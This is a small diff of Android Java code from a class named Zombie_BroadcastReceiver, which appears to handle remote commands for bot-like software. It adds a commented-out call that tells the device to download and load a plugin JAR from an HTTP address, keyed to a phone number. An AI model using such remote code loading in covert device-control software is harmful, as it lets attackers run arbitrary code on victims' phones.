@@ -72,6 +72,7 @@ public class Zombie_BroadcastReceiver extends BroadcastReceiver {
 				mPool.invokeCommand("text:%s",mPool.mEvents.get(action));
 				NetLog.v("Event %s will be %s",action,reply);
 			}
+			 //mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@get plugin from:http://192.168.1.5/Test.jar",false));
 			 //mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@notify title:Title;text:Hello Text World",false));
 		}
 		
